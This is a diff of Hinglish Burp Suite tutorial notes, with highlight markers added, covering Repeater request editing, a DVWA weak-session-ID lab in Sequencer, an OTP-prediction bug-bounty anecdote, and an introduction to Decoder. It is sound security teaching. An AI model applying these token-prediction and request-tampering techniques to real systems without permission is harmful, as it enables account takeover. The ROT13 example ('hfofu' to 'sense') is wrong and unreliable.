-Repeater Burp Suite ka ek tool hai jo **manual testing** ke liye use hota hai. Tum kisi bhi HTTP request ko Repeater mein bhej sakte ho, uske parameters, headers, body ko modify kar sakte ho, aur server ka response dekh sakte ho. Ye **tampering** aur **exploit verification** ke liye ideal hai. Request bhejne ka tareeka: Proxy, Target, ya kisi b tool se request par right-click karo → "Send to Repeater".
+[[HL::Repeater Burp Suite ka ek tool hai jo **manual testing** ke liye use hota hai. Tum kisi bhi HTTP request ko Repeater mein bhej sakte ho, uske parameters, headers, body ko modify kar sakte ho, aur server ka response dekh sakte ho. Ye **tampering** aur **exploit verification** ke liye ideal hai. Request bhejne ka tareeka: Proxy, Target, ya kisi b tool se request par right-click karo → "Send to Repeater::HL]]".
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Jab tum koi vulnerability explore kar rahe ho (jaise SQL injection), toh tumhe ek request baar-baar thoda modify karke bhejni hoti hai aur response dekhna hota hai. Har baar browser se request bhejna, proxy mein intercept karna – time waste hai.  
-**Solution:** Repeater mein request ek baar bhejo, phir jitni baar chahe modify karo aur turant response dekho. Ye **fast hai**, **efficient hai**, aur tumhe manual testing ka pura control deta hai.
+[[HL::**Problem:** Jab tum koi vulnerability explore kar rahe ho (jaise SQL injection), toh tumhe ek request baar-baar thoda modify karke bhejni hoti hai aur response dekhna hota hai. Har baar browser se request bhejna, proxy mein intercept karna – time waste hai.::HL]]  
+[[HL::**Solution:** Repeater mein request ek baar bhejo, phir jitni baar chahe modify karo aur turant response dekho. Ye **fast hai**, **efficient hai**, aur tumhe manual testing ka pura control deta hai::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Jab tum kisi request ko "Send to Repeater" karoge:
-- Burp ke top menu mein **Repeater** tab par ek number dikhega (e.g., "Repeater 1").
-- Us tab par click karo toh do panels dikhenge:
-  - **Left side (top):** Request edit karne ka box (raw request).
-  - **Right side (top):** Response display (raw, headers, etc.).
-  - Neeche **Send** button, aur **Render** option.
+[[HL::Jab tum kisi request ko "Send to Repeater" karoge:::HL]]
+- [[HL::Burp ke top menu mein **Repeater** tab par ek number dikhega (e.g., "Repeater 1").::HL]]
+- [[HL::Us tab par click karo toh do panels dikhenge:::HL]]
+  - [[HL::**Left side (top):** Request edit karne ka box (raw request).::HL]]
+  - [[HL::**Right side (top):** Response display (raw, headers, etc.).::HL]]
+  - [[HL::Neeche **Send** button, aur **Render** option::HL]].
   - Left side ke upar **Go** button (send ke liye).
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-1. Jab tum "Send to Repeater" karte ho, Burp us request ki copy le leta hai aur Repeater module ke ek naye tab mein rakh deta hai.
-2. Request raw format mein hoti hai (HTTP method, path, headers, body).
-3. Tum request edit kar sakte ho – Burp real-time mein text change hone deta hai.
-4. Jab "Send" click karte ho, Burp ye modified request server ko bhejta hai (same host/port jo request mein specified hai).
-5. Response aata hai, Burp usay parse karta hai aur right panel mein display karta hai.
-6. Tum multiple tabs rakh sakte ho – har tab ek alag request handle karta hai.
+1. [[HL::Jab tum "Send to Repeater" karte ho, Burp us request ki copy le leta hai aur Repeater module ke ek naye tab mein rakh deta hai.::HL]]
+2. [[HL::Request raw format mein hoti hai (HTTP method, path, headers, body).::HL]]
+3. [[HL::Tum request edit kar sakte ho – Burp real-time mein text change hone deta hai.::HL]]
+4. [[HL::Jab "Send" click karte ho, Burp ye modified request server ko bhejta hai (same host/port jo request mein specified hai).::HL]]
+5. [[HL::Response aata hai, Burp usay parse karta hai aur right panel mein display karta hai.::HL]]
+6. [[HL::Tum multiple tabs rakh sakte ho – har tab ek alag request handle karta hai::HL]].
 
 ### 💻 7. Hands-On: Step-by-Step Practical:
-**Step 1: Ek request capture karo.**
+[[HL::**Step 1: Ek request capture karo.**::HL]]
 ```text
-- Browser mein kuch karo (e.g., login form submit karo).
-- Burp Proxy mein request intercept karo ya HTTP History se koi request dhundho.
+- [[HL::Browser mein kuch karo (e.g., login form submit karo).::HL]]
+- [[HL::Burp Proxy mein request intercept karo ya HTTP History se koi request dhundho.::HL]]
 ```
-**Step 2: Request ko Repeater mein bhejo.**
+[[HL::**Step 2: Request ko Repeater mein bhejo.**::HL]]
 ```text
-- Us request par RIGHT-CLICK karo (mouse right button).
-- Menu khulega → "Send to Repeater" par click karo.
+- [[HL::Us request par RIGHT-CLICK karo (mouse right button).::HL]]
+- [[HL::Menu khulega → "Send to Repeater" par click karo.::HL]]
 ```
-**Step 3: Repeater tab open karo.**
+[[HL::**Step 3: Repeater tab open karo.**::HL]]
 ```text
-- Burp ke top menu mein "Repeater" tab par click karo (e.g., "Repeater 1").
-- Ab tum request ko edit kar sakte ho.
+- [[HL::Burp ke top menu mein "Repeater" tab par click karo (e.g., "Repeater 1").::HL]]
+- [[HL::Ab tum request ko edit kar sakte::HL]] ho.
 ```
-**Step 4: Request modify karo.**
+[[HL::**Step 4: Request modify karo.**::HL]]
 ```text
-- Maan lo tumhe username parameter badalna hai. Request mein jaise "username=admin" dikhega, usko select karo aur "username=hacker" likho.
+- [[HL::Maan lo tumhe username parameter badalna hai. Request mein jaise "username=admin" dikhega, usko select karo aur "username=hacker" likho.::HL]]
 ```
-**Step 5: Send karo.**
+[[HL::**Step 5: Send karo.**::HL]]
 ```text
-- "Send" button click karo (ya Go button).
-- Right panel mein response aayega – status code, headers, body.
+- [[HL::"Send" button click karo (ya Go button).::HL]]
+- [[HL::Right panel mein response aayega – status code, headers, body.::HL]]
 ```
-**Step 6: Response dekho.**
+[[HL::**Step 6: Response dekho.**::HL]]
 ```text
-- Response ke neeche tabs hain: Raw, Headers, Hex, Render.
-- "Raw" mein full response. "Render" mein browser-like preview.
+- [[HL::Response ke neeche tabs hain: Raw, Headers, Hex, Render.::HL]]
+- [[HL::"Raw" mein full response. "Render" mein browser-like preview::HL]].
 ```
-**Expected Screen:**
+**[[HL::Expected Screen::HL]]:**
 ```
-Left panel (request):
-GET /login?username=hacker&password=123 HTTP/1.1
-Host: example.com
+[[HL::Left panel (request):::HL]]
+[[HL::GET /login?username=hacker&password=123 HTTP/1.1::HL]]
+[[HL::Host: example.com::HL]]
 
-Right panel (response):
-HTTP/1.1 200 OK
-Content-Type: text/html
-...
-<h1>Login Failed</h1>
+[[HL::Right panel (response):::HL]]
+[[HL::HTTP/1.1 200 OK::HL]]
+[[HL::Content-Type: text/html::HL]]
+[[HL::...::HL]]
+[[HL::<h1>Login Failed</h1::HL]]>
 ```
 
 ### ⚖️ 8. Comparison (Repeater vs Intruder):
-| Feature | Repeater | Intruder |
-|---------|----------|----------|
-| **Purpose** | Manual single-request testing | Automated multiple-request attacks |
-| **Speed** | Ek request at a time | High-speed, concurrent |
-| **Modifications** | Manual edit each time | Payloads defined once, automated |
-| **Use Case** | Exploit verification, debugging | Brute-force, fuzzing, wordlist attacks |
+| [[HL::Feature | Repeater | Intruder |::HL]]
+[[HL::|---------|----------|----------|::HL]]
+[[HL::| **Purpose** | Manual single-request testing | Automated multiple-request attacks |::HL]]
+[[HL::| **Speed** | Ek request at a time | High-speed, concurrent |::HL]]
+[[HL::| **Modifications** | Manual edit each time | Payloads defined once, automated |::HL]]
+[[HL::| **Use Case** | Exploit verification, debugging | Brute-force, fuzzing, wordlist attacks::HL]] |
 
 ### 🚫 9. Common Mistakes (Beginner Traps):
 - **Mistake 1:** Request bhejne ke baad response aata hai, lekin galat response (e.g., 404) aata hai toh sochte hain ki Repeater kharab hai. **Fix:** Check karo ki host/port sahi hai, aur request valid hai (e.g., session token required ho sakta hai).
@@ -4493,8 +4493,8 @@ Content-Type: text/html
 - **Mistake 3:** Multiple tabs mein confuse ho jana. **Fix:** Tab ko rename karo (double-click on tab name) – e.g., "Login bypass test".
 
 ### 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
-- **"Log sochte hain ki Repeater mein request bhejne ke liye har baar proxy se bhejni padti hai."**  
-  **Actually:** Ek baar request Repeater mein aa gayi, tum usko baar-baar modify kar ke bhej sakte ho, proxy ki zaroorat nahi.
+- **"[[HL::Log sochte hain ki Repeater mein request bhejne ke liye har baar proxy se bhejni padti hai."::HL]]**  
+  [[HL::**Actually:** Ek baar request Repeater mein aa gayi, tum usko baar-baar modify kar ke bhej sakte ho, proxy ki zaroorat nahi::HL]].
 - **"Log confuse hote hain ki Repeater mein response kabhi kabhi nahi aata."**  
   **Actually:** Ho sakta hai server ne connection close kar diya ho, ya request mein kuch galat ho (e.g., Content-Length mismatch). Response na aaye toh error check karo (neeche status bar mein error message dikhega).
 
@@ -4516,9 +4516,9 @@ Content-Type: text/html
 ```
 
 ### 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1:** Repeater mein multiple tabs use karo – ek tab for login bypass, ek for IDOR, ek for XSS. Tabs rename karo.
+- [[HL::**Tip 1:** Repeater mein multiple tabs use karo – ek tab for login bypass, ek for IDOR, ek for XSS. Tabs rename karo::HL]].
 - **Tip 2:** Agar tumhe request ka path alag server par bhejna hai, toh request ke host header ko manually edit kar sakte ho.
-- **Tip 3:** Response mein interesting keywords dhundhne ke liye Ctrl+F use karo.
+- [[HL::**Tip 3:** Response mein interesting keywords dhundhne ke liye Ctrl+F use karo::HL]].
 - **Tip 4:** Render tab use karo to see how the page looks in browser.
 
 ### ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
@@ -4526,14 +4526,14 @@ Content-Type: text/html
 - **Scenario 2:** CSRF token update karna bhool gaye, server ne request reject kar di – to vulnerability miss ho sakti hai agar token required ho.
 
 ### ❓ 15. FAQ (Interview Questions):
-- **Q1: Repeater mein request kaise bhejte hain?**  
-  **A1:** Kisi bhi request (proxy, history, etc.) par right-click → "Send to Repeater". Phir Repeater tab mein jaake "Send" click karo.
+- [[HL::**Q1: Repeater mein request kaise bhejte hain?**::HL]]  
+  [[HL::**A1:** Kisi bhi request (proxy, history, etc.) par right-click → "Send to Repeater". Phir Repeater tab mein jaake "Send" click karo::HL]].
 - **Q2: Kya Repeater mein multiple requests ek saath handle kar sakte hain?**  
   **A2:** Haan, multiple tabs ke through. Har tab alag request rakhta hai.
 - **Q3: Repeater aur Intruder mein kya antar hai?**  
   **A3:** Repeater manual single request testing ke liye, Intruder automated mass testing ke liye.
-- **Q4: Kya Repeater mein request history hoti hai?**  
-  **A4:** Undo/Redo arrows se previous modifications par ja sakte ho, lekin persistent history nahi hoti.
+- [[HL::**Q4: Kya Repeater mein request history hoti hai?**::HL]]  
+  [[HL::**A4:** Undo/Redo arrows se previous modifications par ja sakte ho, lekin persistent history nahi hoti::HL]].
 - **Q5: Repeater mein response nahi aa raha – kya karein?**  
   **A5:** Check karo ki request mein host/port sahi hai, ya server ne connection close kiya. Burp ke error log mein dekho.
 
@@ -4562,7 +4562,7 @@ Repeater multiple features provide karta hai:
 - **Request Modification:** Raw HTTP request ko directly edit karna (parameters, headers, body).
 - **Send:** Modified request server ko bhejna aur response dekhna.
 - **Render:** Response ko browser ki tarah render karna (images, HTML).
-- **Multiple Tabs:** Har tab independent request rakhta hai, rename kar sakte ho.
+- [[HL::**Multiple Tabs:** Har tab independent request rakhta hai, rename kar sakte ho::HL]].
 - **Undo/Redo:** Request edits ke beech navigation (history).
 - **Change Request Method:** Right-click → Change request method (GET↔POST) – headers automatically adjust.
 - **Paste URL as Request:** Clipboard se URL paste karke automatically HTTP request generate karta hai.
@@ -4602,10 +4602,10 @@ Right-click on request box: Context menu with "Change request method", "Paste UR
 - Response right panel mein "Render" tab click karo.
 - Agar response HTML page hai, toh browser jaisa dikhega.
 ```
-**Step 3: Multiple Tabs banao aur rename karo.**
+[[HL::**Step 3: Multiple Tabs banao aur rename karo.**::HL]]
 ```text
-- "+" button click karo → naya blank tab (ya kisi request ko send to repeater karke naya tab aata hai).
-- Tab par double-click karo → naam likho "Login Bypass", Enter dabao.
+- [[HL::"+" button click karo → naya blank tab (ya kisi request ko send to repeater karke naya tab aata hai).::HL]]
+- [[HL::Tab par double-click karo → naam likho "Login Bypass", Enter dabao::HL]].
 ```
 **Step 4: Undo/Redo arrows.**
 ```text
@@ -4613,12 +4613,12 @@ Right-click on request box: Context menu with "Change request method", "Paste UR
 - Upar left arrow "<" click karo → pichli change par wapas (id=2).
 - Right arrow ">" click karo → aage (id=3).
 ```
-**Step 5: Change Request Method.**
+[[HL::**Step 5: Change Request Method.**::HL]]
 ```text
-- Request box mein RIGHT-CLICK karo.
-- Menu se "Change request method" select karo.
-- Agar GET tha to POST ban jayega, aur body mein parameters aa jayenge.
-- Phir "Send" karo.
+- [[HL::Request box mein RIGHT-CLICK karo.::HL]]
+- [[HL::Menu se "Change request method" select karo.::HL]]
+- [[HL::Agar GET tha to POST ban jayega, aur body mein parameters aa jayenge.::HL]]
+- [[HL::Phir "Send" karo::HL]].
 ```
 **Step 6: Paste URL as Request.**
 ```text
@@ -4639,7 +4639,7 @@ Right-click on request box: Context menu with "Change request method", "Paste UR
 
 ### 🚫 9. Common Mistakes (Beginner Traps):
 - **Mistake 1:** Paste URL as request use kiya, lekin HTTPS website ke liye "Use HTTPS" checkbox bhool gaye. Request 80 port par jayegi, response nahi aayega. **Fix:** Repeater tab ke neeche (or in options) port set karo, ya request mein Host header ke saath port 443 likho.
-- **Mistake 2:** Change request method se POST se GET kiya, lekin body hata di, lekin Content-Length header update nahi hua (Burp automatically karta hai, but manual check karo). **Fix:** Ensure Content-Length 0 hai ya remove karo.
+- [[HL::**Mistake 2:** Change request method se POST se GET kiya, lekin body hata di, lekin Content-Length header update nahi hua (Burp automatically karta hai, but manual check karo). **Fix:** Ensure Content-Length 0 hai ya remove karo::HL]].
 - **Mistake 3:** Multiple tabs mein alag requests hain, lekin ek tab mein change kar ke doosre tab mein send kar diya. **Fix:** Tab select karke send karo.
 - **Mistake 4:** Render tab mein kuch nahi dikhta – ho sakta hai response mein image ya binary data ho. **Fix:** Raw tab mein dekho.
 
@@ -4678,14 +4678,14 @@ Right-click on request box: Context menu with "Change request method", "Paste UR
 - **Scenario 3:** Undo/Redo arrows ka overuse – kuch important change undo ho gaya aur pata nahi chala – ho sakta hai vulnerability miss ho jaye.
 
 ### ❓ 15. FAQ (Interview Questions):
-- **Q1: Repeater mein multiple tabs kaise add karte hain?**  
-  **A1:** "+" button click karo ya kisi bhi request ko "Send to Repeater" karo – automatically naya tab ban jayega.
-- **Q2: Tab rename kaise karein?**  
-  **A2:** Tab par double-click karo, naya naam likho, Enter dabao.
+- [[HL::**Q1: Repeater mein multiple tabs kaise add karte hain?**::HL]]  
+  [[HL::**A1:** "+" button click karo ya kisi bhi request ko "Send to Repeater" karo – automatically naya tab ban jayega::HL]].
+- [[HL::**Q2: Tab rename kaise karein?**::HL]]  
+  [[HL::**A2:** Tab par double-click karo, naya naam likho, Enter dabao::HL]].
 - **Q3: Undo/Redo arrows kahan milte hain?**  
   **A3:** Request box ke upar, Send button ke bagal mein.
-- **Q4: Change request method ka option kahan hai?**  
-  **A4:** Request box mein right-click → "Change request method".
+- [[HL::**Q4: Change request method ka option kahan hai?**::HL]]  
+  [[HL::**A4:** Request box mein right-click → "Change request method::HL]]".
 - **Q5: Paste URL as request se kya hota hai?**  
   **A5:** Clipboard se URL lekar Burp ek HTTP GET request generate karta hai, jise tum modify kar sakte ho.
 - **Q6: Render tab kaam kyu nahi kar raha?**  
@@ -4712,13 +4712,13 @@ Main aapko ek-ek karke saare 4 tools sikhata hoon - **Sequencer, Decoder, Compar
 
 Socho tum ek **Lottery Ticket** kharidte ho. Lottery ki ticket par ek **unique number** hota hai. Agar lottery company har baar wahi number chhap de (jaise sabko 12345 mile), toh kya hoga? Pehle wala ticket dekhke tum agle ticket ka number predict kar sakte ho, aur lottery jeet sakte ho!
 
-**Sequencer bilkul yahi kaam karta hai:**
+**[[HL::Sequencer bilkul yahi kaam karta hai::HL]]:**
 
-Jab bhi tum kisi website par login karte ho, server tumhe ek **"Digital Lottery Ticket"** deta hai jise **Session ID** ya **CSRF Token** kehte hain. Ye token unique hona chahiye aur random - jaise har lottery ticket ka number unique hota hai.
+[[HL::Jab bhi tum kisi website par login karte ho, server tumhe ek **"Digital Lottery Ticket"** deta hai jise **Session ID** ya **CSRF Token** kehte hain. Ye token unique hona chahiye aur random - jaise har lottery ticket ka number unique hota hai.::HL]]
 
-**Problem:** Agar ye token weak randomness se bana hai (jaise 1,2,3,4... ya koi pattern follow karta hai), toh hacker agla token predict kar sakta hai aur tumhara account hijack kar sakta hai!
+[[HL::**Problem:** Agar ye token weak randomness se bana hai (jaise 1,2,3,4... ya koi pattern follow karta hai), toh hacker agla token predict kar sakta hai aur tumhara account hijack kar sakta hai::HL]]!
 
-**Sequencer ka kaam:** Ye check karta hai ki server jo tokens de raha hai, wo kitne **random** hain. Jaise lottery inspector check karta hai ki numbers truly random hain ya fixed pattern mein aa rahe hain.
+[[HL::**Sequencer ka kaam:** Ye check karta hai ki server jo tokens de raha hai, wo kitne **random** hain. Jaise lottery inspector check karta hai ki numbers truly random hain ya fixed pattern mein aa rahe hain::HL]].
 
 ## 📖 3. Technical Definition (Interview Answer):
 
@@ -4732,27 +4732,27 @@ Jab bhi tum kisi website par login karte ho, server tumhe ek **"Digital Lottery 
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 
-**Problem (Without Sequencer):**
-Maano tum ek bank ki website test kar rahe ho. Jab tum login karte ho, server tumhe ek session cookie deta hai: `session=abc123`. Tum dobaara login karo to `session=abc124` milta hai. Teesri baar `session=abc125` milta hai.
+**[[HL::Problem (Without Sequencer)::HL]]:**
+[[HL::Maano tum ek bank ki website test kar rahe ho. Jab tum login karte ho, server tumhe ek session cookie deta hai: `session=abc123`. Tum dobaara login karo to `session=abc124` milta hai. Teesri baar `session=abc125` milta hai.::HL]]
 
-**Kya problem hai?**
-Token mein pattern dikh raha hai - `abc` ke baad numbers 123, 124, 125 aa rahe hain. Iska matlab agla token `abc126` hoga! Agar hacker ye pattern identify kar le, toh wo kisi aur user ka token generate kar ke account mein ghus sakta hai.
+[[HL::**Kya problem hai?**::HL]]
+[[HL::Token mein pattern dikh raha hai - `abc` ke baad numbers 123, 124, 125 aa rahe hain. Iska matlab agla token `abc126` hoga! Agar hacker ye pattern identify kar le, toh wo kisi aur user ka token generate kar ke account mein ghus sakta hai::HL]].
 
-**Solution (With Sequencer):**
-Sequencer 100-200 tokens collect karta hai aur unka statistical analysis karta hai:
-- Check karta hai ki tokens mein koi pattern to nahi?
-- "Character-level analysis" karta hai - har character kitna random hai?
-- "Bit-level analysis" karta hai - binary level par pattern hai ya nahi?
+**[[HL::Solution (With Sequencer)::HL]]:**
+[[HL::Sequencer 100-200 tokens collect karta hai aur unka statistical analysis karta hai:::HL]]
+- [[HL::Check karta hai ki tokens mein koi pattern to nahi?::HL]]
+- [[HL::"Character-level analysis" karta hai - har character kitna random hai?::HL]]
+- [[HL::"Bit-level analysis" karta hai - binary level par pattern hai ya nahi?::HL]]
 
-Agar report mein "Poor randomness" dikhe, toh server ki token generation algorithm weak hai - developer ko fix karna hoga.
+[[HL::Agar report mein "Poor randomness" dikhe, toh server ki token generation algorithm weak hai - developer ko fix karna hoga::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
 
-**Location:** Burp Suite ke top menu mein **"Sequencer"** tab hota hai. Ya kisi request par right-click karke **"Send to Sequencer"** kar sakte ho.
+[[HL::**Location:** Burp Suite ke top menu mein **"Sequencer"** tab hota hai. Ya kisi request par right-click karke **"Send to Sequencer"** kar sakte ho.::HL]]
 
-**Jab Sequencer khulega, 3 main sections dikhenge:**
+**[[HL::Jab Sequencer khulega, 3 main sections dikhenge::HL]]:**
 
-**1. Token Location within Response:**
+**[[HL::1. Token Location within Response::HL]]:**
 ```
 [o] Form field: [csrf_token=_________]
 [o] Custom location: [________________]
@@ -4824,90 +4824,90 @@ Step 6: Report Generation
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 
-**Step 1: Target Application Open karo (DVWA - Weak Session ID)**
+[[HL::**Step 1: Target Application Open karo (DVWA - Weak Session ID)**::HL]]
 ```text
-1. Apna browser kholo aur DVWA (Damn Vulnerable Web Application) open karo.
-2. Login karo (admin/password).
-3. Left side menu mein "DVWA Security" par click karo.
-4. Security Level ko "Medium" par set karo (Weak session ID ke liye medium level perfect hai).
-5. Ab left side menu mein "Weak Session IDs" par click karo.
+1. [[HL::Apna browser kholo aur DVWA (Damn Vulnerable Web Application) open karo.::HL]]
+2. [[HL::Login karo (admin/password).::HL]]
+3. [[HL::Left side menu mein "DVWA Security" par click karo.::HL]]
+4. [[HL::Security Level ko "Medium" par set karo (Weak session ID ke liye medium level perfect hai).::HL]]
+5. [[HL::Ab left side menu mein "Weak Session IDs" par click karo.::HL]]
 ```
 
-**Step 2: Burp Suite Proxy Enable karo**
+[[HL::**Step 2: Burp Suite Proxy Enable karo**::HL]]
 ```text
-1. Burp Suite mein "Proxy" tab par jao → "Intercept" sub-tab.
-2. "Intercept is on" button check karo (on hona chahiye).
-3. Browser mein "Generate" button par click karo (DVWA ke Weak Session IDs page par hai).
-4. Burp Suite mein request intercept ho jayegi.
+1. [[HL::Burp Suite mein "Proxy" tab par jao → "Intercept" sub-tab.::HL]]
+2. [[HL::"Intercept is on" button check karo (on hona chahiye).::HL]]
+3. [[HL::Browser mein "Generate" button par click karo (DVWA ke Weak Session IDs page par hai).::HL]]
+4. [[HL::Burp Suite mein request intercept ho jayegi.::HL]]
 ```
 
-**Screen par kya dikhega:**
+**[[HL::Screen par kya dikhega::HL]]:**
 ```http
-GET /dvwa/vulnerabilities/weak_id/ HTTP/1.1
-Host: localhost
-Cookie: PHPSESSID=abc123; security=medium
+GET /[[HL::dvwa/vulnerabilities/weak_id/ HTTP/1.1::HL]]
+[[HL::Host: localhost::HL]]
+[[HL::Cookie: PHPSESSID=abc123; security=medium::HL]]
 ```
 
-**Step 3: Response Check karo (Token kahan hai?)**
+[[HL::**Step 3: Response Check karo (Token kahan hai?)**::HL]]
 ```text
-1. Intercepted request ko "Forward" karo (ek baar click karo).
-2. Response aayega - usko bhi forward mat karo abhi.
-3. Response mein neeche scroll karo - tumhe dikhega:
+1. [[HL::Intercepted request ko "Forward" karo (ek baar click karo).::HL]]
+2. [[HL::Response aayega - usko bhi forward mat karo abhi.::HL]]
+3. [[HL::Response mein neeche scroll karo - tumhe dikhega:::HL]]
 ```
 ```http
-HTTP/1.1 200 OK
-Set-Cookie: dvwaSession=16273421; Path=/
+[[HL::HTTP/1.1 200 OK::HL]]
+[[HL::Set-Cookie: dvwaSession=16273421; Path=/::HL]]
 ```
-**Yeh dvwaSession=16273421 hai token - isi ko hum test karenge.**
+[[HL::**Yeh dvwaSession=16273421 hai token - isi ko hum test karenge.**::HL]]
 
-**Step 4: Request ko Sequencer mein bhejo**
+[[HL::**Step 4: Request ko Sequencer mein bhejo**::HL]]
 ```text
-1. Jis request ne response generate kiya, us par RIGHT-CLICK karo (mouse ka right button).
-2. Menu khulega - usme "Send to Sequencer" par CLICK karo.
-3. Ek popup aayega "Send request to Sequencer?" - "Yes" kar do.
+1. [[HL::Jis request ne response generate kiya, us par RIGHT-CLICK karo (mouse ka right button).::HL]]
+2. [[HL::Menu khulega - usme "Send to Sequencer" par CLICK karo.::HL]]
+3. [[HL::Ek popup aayega "Send request to Sequencer?" - "Yes" kar do.::HL]]
 ```
 
-**Step 5: Sequencer mein token location set karo**
+[[HL::**Step 5: Sequencer mein token location set karo**::HL]]
 ```text
-1. Upar "Sequencer" tab par click karo (top menu mein).
-2. "Token Location within Response" section dikhega.
-3. Yahan tum dekhoge ki Burp ne automatically cookie detect kar li hai:
-   [x] Cookie: dvwaSession = [16273421]
-4. Agar automatically detect nahi hota, toh manually bata sakte ho:
-   - "Custom location" select karo
-   - Response text mein dvwaSession= ke baad wali value select karo
-   - "Add" button click karo
+1. [[HL::Upar "Sequencer" tab par click karo (top menu mein).::HL]]
+2. [[HL::"Token Location within Response" section dikhega.::HL]]
+3. [[HL::Yahan tum dekhoge ki Burp ne automatically cookie detect kar li hai:::HL]]
+   [[HL::[x] Cookie: dvwaSession = [16273421]::HL]]
+4. [[HL::Agar automatically detect nahi hota, toh manually bata sakte ho:::HL]]
+   - [[HL::"Custom location" select karo::HL]]
+   - [[HL::Response text mein dvwaSession= ke baad wali value select karo::HL]]
+   - [[HL::"Add" button click karo::HL]]
 ```
 
-**Step 6: Live Capture start karo**
+[[HL::**Step 6: Live Capture start karo**::HL]]
 ```text
-1. "Start live capture" button par CLICK karo (neeche right side).
-2. Burp ab automatically 100-200 requests bhejna shuru kar dega.
-3. Tum dekho ge:
-   "Tokens captured: 5 / 20000" - ye number badhta jayega.
-4. Jab 200-300 tokens capture ho jayein (ya 1-2 minute baad), "Stop" button click karo.
+1. [[HL::"Start live capture" button par CLICK karo (neeche right side).::HL]]
+2. [[HL::Burp ab automatically 100-200 requests bhejna shuru kar dega.::HL]]
+3. [[HL::Tum dekho ge:::HL]]
+   [[HL::"Tokens captured: 5 / 20000" - ye number badhta jayega.::HL]]
+4. [[HL::Jab 200-300 tokens capture ho jayein (ya 1-2 minute baad), "Stop" button click karo.::HL]]
 ```
 
-**Step 7: Analysis karo**
+[[HL::**Step 7: Analysis karo**::HL]]
 ```text
-1. "Analyze now" button par CLICK karo (ab ye active ho jayega).
-2. Burp analysis shuru karega - 10-15 second lagega.
-3. Ek naya window khulega - "Sequencer Analysis Report".
+1. [[HL::"Analyze now" button par CLICK karo (ab ye active ho jayega).::HL]]
+2. [[HL::Burp analysis shuru karega - 10-15 second lagega.::HL]]
+3. [[HL::Ek naya window khulega - "Sequencer Analysis Report".::HL]]
 ```
 
-**Expected Output (Report Summary):**
+**[[HL::Expected Output (Report Summary::HL]]):**
 ```text
-Overall Result: Poor Randomness
-[!!!!] The tokens show significant patterns!
+[[HL::Overall Result: Poor Randomness::HL]]
+[[HL::[!!!!] The tokens show significant patterns!::HL]]
 
-Character-level analysis:
-- First 3 characters are always "162"
-- Last 5 characters are incrementing by 1
-- Entropy: 12 bits (should be > 50 bits)
+[[HL::Character-level analysis:::HL]]
+- [[HL::First 3 characters are always "162"::HL]]
+- [[HL::Last 5 characters are incrementing by 1::HL]]
+- [[HL::Entropy: 12 bits (should be > 50 bits)::HL]]
 
-Significance level: 0.01 (Very predictable)
+[[HL::Significance level: 0.01 (Very predictable::HL]])
 ```
-**Matlab:** Token weak hai - 162 se start hota hai aur last numbers 1-2-3 jaise badh rahe hain. Hacker predict kar sakta hai!
+[[HL::**Matlab:** Token weak hai - 162 se start hota hai aur last numbers 1-2-3 jaise badh rahe hain. Hacker predict kar sakta hai::HL]]!
 
 ## ⚖️ 8. Comparison (Sequencer vs Intruder):
 
@@ -4921,8 +4921,8 @@ Significance level: 0.01 (Very predictable)
 
 ## 🚫 9. Common Mistakes (Beginner Traps):
 
-- **Mistake 1:** Sirf 10-20 tokens capture karke analyze karna.
-  - **Fix:** Kam se kam 100 tokens capture karo. 200 zyada better. Statistics ke liye sample size bada chahiye.
+- [[HL::**Mistake 1:** Sirf 10-20 tokens capture karke analyze karna.::HL]]
+  - [[HL::**Fix:** Kam se kam 100 tokens capture karo. 200 zyada better. Statistics ke liye sample size bada chahiye::HL]].
 
 - **Mistake 2:** Galat token select karna.
   - **Fix:** Response mein dhyaan se dekho - cookie mein hai ya form field mein? DVWA mein `dvwaSession` cookie mein hai, request mein nahi.
@@ -4946,16 +4946,16 @@ Significance level: 0.01 (Very predictable)
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 
-**Scenario:** Ek real bug bounty program mein, researcher ne notice kiya ki website password reset ke liye 6-digit OTP bhejti hai.
+[[HL::**Scenario:** Ek real bug bounty program mein, researcher ne notice kiya ki website password reset ke liye 6-digit OTP bhejti hai.::HL]]
 
-**How they used Sequencer:**
-1. Password reset request ki - OTP aaya `123456`.
-2. Dobara request ki - OTP aaya `123789`.
-3. Researcher ne suspect kiya ki OTP random nahi hai.
-4. Sequencer mein 200 OTP capture kiye.
-5. Analysis revealed ki OTP server timestamp se generate ho rahe the - predictable!
+**[[HL::How they used Sequencer::HL]]:**
+1. [[HL::Password reset request ki - OTP aaya `123456`.::HL]]
+2. [[HL::Dobara request ki - OTP aaya `123789`.::HL]]
+3. [[HL::Researcher ne suspect kiya ki OTP random nahi hai.::HL]]
+4. [[HL::Sequencer mein 200 OTP capture kiye.::HL]]
+5. [[HL::Analysis revealed ki OTP server timestamp se generate ho rahe the - predictable!::HL]]
 
-**Result:** Researcher ne exploit likha - agle 10 minutes ke OTP predict kar ke kisi bhi user ka password reset kar diya. **$5,000 bounty** mila!
+[[HL::**Result:** Researcher ne exploit likha - agle 10 minutes ke OTP predict kar ke kisi bhi user ka password reset kar diya. **$5,000 bounty** mila::HL]]!
 
 ## 🎨 12. Visual Diagram (ASCII Art):
 
@@ -5037,48 +5037,48 @@ START
 
 Socho tumhe apna dost ek **"gujjubhai"** language mein message bhejta hai - "hfofu". Tum samjhe nahi. Phir wo batata hai ki iska matlab "ROT13" encoding hai - har letter 13 positions aage badha do. "h" -> "u", "f" -> "s"... "hfofu" decode karo to "sense" banta hai!
 
-**Decoder bilkul yahi kaam karta hai:**
+**[[HL::Decoder bilkul yahi kaam karta hai::HL]]:**
 
-Internet par data alag-alag forms mein travel karta hai:
-- Kabhi **Base64** mein encode hota hai (jaise email attachments)
-- Kabhi **URL encoded** hota hai (jaise space %20 ban jata hai)
-- Kabhi **HTML entities** mein badal jaata hai (jaise < > symbols)
+[[HL::Internet par data alag-alag forms mein travel karta hai:::HL]]
+- [[HL::Kabhi **Base64** mein encode hota hai (jaise email attachments)::HL]]
